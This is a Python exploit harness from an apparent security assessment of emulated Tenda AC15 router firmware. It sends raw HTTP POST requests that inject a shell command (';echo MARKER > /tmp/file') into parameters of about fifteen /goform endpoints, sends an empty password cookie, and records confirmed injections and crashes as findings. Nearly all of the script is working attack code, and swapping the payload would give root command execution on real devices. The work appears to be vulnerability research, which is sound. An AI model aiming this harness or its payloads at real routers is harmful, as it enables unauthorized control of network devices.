#!/usr/bin/env python3
"""
phase4b_targeted_injection.py - Targeted Command Injection Testing

Tests specific handlers with the CORRECT parameter names found via r2 analysis.
Each handler is tested with a file-creation payload to prove injection.

Targets:
- formSetSpeedWan: "speed_dir" → td_acs_dbg -i %s ...
- formSetSambaConf: username → smbpasswd -a %s ...
- formSetQosBand: list param → iptables rules
- formSetDeviceName: devName → system command
- fromSetSysTime: multiple params → system time commands
- formNatSet: nat params → iptables nat rules
- formSetIptv: iptv params → vlan/iptables commands
- formSetClientState: various → network control commands
- formSetAutoQosInfo: auto QoS → traffic control
"""

import sys
sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/secsoft-assessor/skills/security-assessment/scripts')

import socket
import time
import os
import json

from common_base import EvidenceCollector

TARGET = "[REDACTED-INTERNAL-IP]"
PORT = 80
EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/[REDACTED-PROJECT]/[REDACTED-ID]_Tenda/evidence"
ROOTFS = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/[REDACTED-PROJECT]/[REDACTED-ID]_Tenda/firmware/ac15/squashfs-root"

ec = EvidenceCollector(
    "phase4b_targeted_injection",
    output_dir=EVIDENCE_DIR,
    target="Tenda AC15 V15.03.05.19 (QEMU emulated)",
    category="firmware",
    phase="Phase 4b - Targeted Command Injection"
)


def raw_http(path, method="POST", body="", headers_dict=None, timeout=8):
    if headers_dict is None:
        headers_dict = {}
    h = f"{method} {path} HTTP/1.0\r\nHost: {TARGET}\r\n"
    for k, v in headers_dict.items():
        h += f"{k}: {v}\r\n"
    if body:
        h += f"Content-Length: {len(body)}\r\n"
        h += "Content-Type: application/x-www-form-urlencoded\r\n"
    h += "\r\n"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, PORT))
        s.send((h + body).encode())
        resp = b""
        while True:
            try:
                c = s.recv(4096)
                if not c:
                    break
                resp += c
            except:
                break
        s.close()
        resp_str = resp.decode('utf-8', errors='replace')
        first = resp_str.split('\r\n')[0]
        status = int(first.split()[1]) if 'HTTP/' in first else 0
        parts = resp_str.split('\r\n\r\n', 1)
        body_out = parts[1] if len(parts) > 1 else ""
        return status, body_out
    except Exception as e:
        return 0, str(e)


def is_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((TARGET, PORT))
        s.send(b"GET / HTTP/1.0\r\nHost: [REDACTED-INTERNAL-IP]\r\n\r\n")
        resp = s.recv(100)
        s.close()
        return b"HTTP/" in resp
    except:
        return False


def restart_httpd():
    os.system("sudo killall qemu-arm 2>/dev/null")
    time.sleep(1)
    cmd = f"sudo /usr/bin/qemu-arm -L {ROOTFS} {ROOTFS}/bin/httpd > /tmp/httpd_phase4b.log 2>&1 &"
    os.system(cmd)
    for _ in range(10):
        time.sleep(1)
        if is_alive():
            return True
    return False


def test_injection(handler_name, endpoint, param_name, marker, extra_params=""):
    """Test a specific parameter for command injection via file creation."""
    proof_file = f"/tmp/cf6_novel_{marker}.txt"
    os.system(f"sudo rm -f {proof_file}")

    payload = f"{param_name}=;echo {marker} > {proof_file}"
    if extra_params:
        payload = f"{extra_params}&{payload}"

    if not is_alive():
        print(f"    [!] httpd dead, restarting...")
        if not restart_httpd():
            return None

    status, body = raw_http(
        endpoint, "POST", payload,
        {"Cookie": "password="},
        timeout=10
    )

    time.sleep(2)

    if os.path.exists(proof_file):
        try:
            with open(proof_file) as f:
                content = f.read().strip()
        except:
            content = "(unreadable)"
        os.system(f"sudo rm -f {proof_file}")
        return {
            "handler": handler_name,
            "endpoint": endpoint,
            "parameter": param_name,
            "marker": marker,
            "content": content,
            "status": status,
            "body_snippet": body[:200],
            "confirmed": True
        }

    return {
        "handler": handler_name,
        "endpoint": endpoint,
        "parameter": param_name,
        "status": status,
        "body_snippet": body[:200],
        "confirmed": False
    }


def main():
    print("=" * 60)
    print(" TendaAssmt TARGETED COMMAND INJECTION TESTING")
    print(f" Target: http://{TARGET}:{PORT}")
    print(f" Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)

    if not is_alive():
        print("[!] httpd not responsive, starting...")
        if not restart_httpd():
            print("[!] Failed to start httpd")
            return

    # Each test: (handler, endpoint, [(param, marker, extra_params)])
    tests = [
        # formSetSpeedWan: td_acs_dbg -i %s auto_bandwidth_measure 5
        ("formSetSpeedWan", "/goform/SetSpeedWan", [
            ("speed_dir", "SPEED1", ""),
            ("usbName", "SPEED2", "speed_dir=1"),
        ]),

        # formSetSambaConf: smbpasswd -a %s -s
        ("formSetSambaConf", "/goform/SetSambaConf", [
            ("usbName", "SAMBA1", ""),
            ("shareSpeed", "SAMBA2", ""),
            ("user", "SAMBA3", ""),
            ("password", "SAMBA4", ""),
        ]),

        # formSetQosBand: iptables-based QoS
        ("formSetQosBand", "/goform/SetQosBand", [
            ("list", "QOS1", ""),
            ("bandwidth", "QOS2", ""),
        ]),

        # formSetDeviceName
        ("formSetDeviceName", "/goform/SetDeviceName", [
            ("devName", "DEVNAME1", ""),
        ]),

        # fromSetSysTime: system time commands
        ("fromSetSysTime", "/goform/setSysTime", [
            ("timeZone", "TIME1", ""),
            ("ntpServer", "TIME2", ""),
        ]),

        # formNatSet: NAT/iptables
        ("formNatSet", "/goform/NatStaticSetting", [
            ("page", "NAT1", ""),
            ("entrys", "NAT2", ""),
        ]),

        # formSetIptv: VLAN/iptables
        ("formSetIptv", "/goform/SetIptv", [
            ("stbEn", "IPTV1", ""),
            ("internet", "IPTV2", ""),
        ]),

        # formSetClientState: network control
        ("formSetClientState", "/goform/SetClientState", [
            ("deviceId", "CLIENT1", "limitEn=1"),
            ("limitSpeed", "CLIENT2", "deviceId=aa:bb:cc:dd:ee:ff"),
        ]),

        # formSetAutoQosInfo: auto QoS traffic control
        ("formSetAutoQosInfo", "/goform/SetAutoQosInfo", [
            ("auto_qos", "AQOS1", ""),
        ]),

        # fromSetWirelessRepeat: wireless repeater
        ("fromSetWirelessRepeat", "/goform/WifiExtraSet", [
            ("wpapsk_crypto", "WREP1", ""),
            ("ssid", "WREP2", ""),
        ]),

        # formAddMacfilterRule: MAC filter (iptables/ebtables)
        ("formAddMacfilterRule", "/goform/addWifiMacFilter", [
            ("deviceId", "MACF1", ""),
            ("deviceMac", "MACF2", ""),
            ("remark", "MACF3", ""),
        ]),

        # formSetFirewallCfg alternate params (11 doSystemCmd calls!)
        ("formSetFirewallCfg", "/goform/SetFirewallCfg", [
            ("pingWanEn", "FW1", "firewallEn=0"),
            ("remoteWebEn", "FW2", "firewallEn=0"),
            ("remoteWebPort", "FW3", "firewallEn=0"),
        ]),

        # formSetIpMacBind: IP-MAC binding (iptables)
        ("fromSetIpMacBind", "/goform/SetIpMacBind", [
            ("bindnum", "IPMAC1", ""),
            ("list", "IPMAC2", ""),
        ]),

        # Test the 'from' variants (different naming convention)
        ("fromSysToolChangePwd", "/goform/SysToolChangePwd", [
            ("SESSION", "PWD1", ""),
            ("COOKIE", "PWD2", ""),
        ]),

        # formSetRemoteWebCfg alternate names
        ("formSetRemoteWebCfg", "/goform/SetRemoteWebCfg", [
            ("remoteWebEn", "REM1", ""),
            ("remoteWebPort", "REM2", ""),
        ]),
    ]

    all_findings = []
    total_tests = 0

    for handler, endpoint, params in tests:
        print(f"\n  [{handler}] Testing {endpoint}...")
        for param, marker, extra in params:
            total_tests += 1
            result = test_injection(handler, endpoint, param, marker, extra)
            if result is None:
                print(f"    [{param}] SKIP (httpd unrecoverable)")
                continue
            if result["confirmed"]:
                print(f"    [{param}] [+] COMMAND INJECTION CONFIRMED! Content: '{result['content']}'")
                all_findings.append(result)
                ec.add_finding(
                    f"[REDACTED-ID]_NOVEL-{len(all_findings)}",
                    "CRITICAL",
                    f"Command Injection in {handler} via '{param}' - FILE CREATION CONFIRMED",
                    f"Parameter '{param}' in endpoint {endpoint} is passed to "
                    f"doSystemCmd/system without sanitization. "
                    f"Proof: echo {marker} > /tmp/cf6_novel_{marker}.txt created file "
                    f"with content '{result['content']}'.",
                    evidence=json.dumps(result, indent=2),
                    impact="Arbitrary command execution as root",
                    cwe="CWE-78: OS Command Injection",
                    cvss="8.8"
                )
            else:
                alive = is_alive()
                crash = " (CRASHED)" if not alive else ""
                print(f"    [{param}] clean (HTTP {result['status']}){crash}")
                if not alive:
                    ec.add_test(
                        f"T_CRASH_{handler}_{param}",
                        f"BOF crash in {handler} via {param}",
                        request_info=f"POST {endpoint}, {param}=;echo...",
                        result="PASS",
                        notes=f"httpd crashed — possible buffer overflow"
                    )

    # Summary
    print("\n" + "=" * 60)
    print(" TARGETED INJECTION RESULTS")
    print("=" * 60)
    print(f"  Total parameters tested: {total_tests}")
    print(f"  Command injections found: {len(all_findings)}")

    if all_findings:
        print("\n  CONFIRMED INJECTIONS:")
        for f in all_findings:
            print(f"    - {f['handler']}.{f['parameter']} → '{f['content']}'")

    ec.add_test("PHASE4B_SUMMARY", "Targeted command injection testing",
               result="PASS" if all_findings else "DONE",
               notes=f"{total_tests} params tested, {len(all_findings)} injections confirmed")

    ec.save(f"{EVIDENCE_DIR}/phase4b_targeted_injection.json")
    print(f"\n[*] Evidence saved to {EVIDENCE_DIR}/phase4b_targeted_injection.json")


if __name__ == "__main__":
    main()
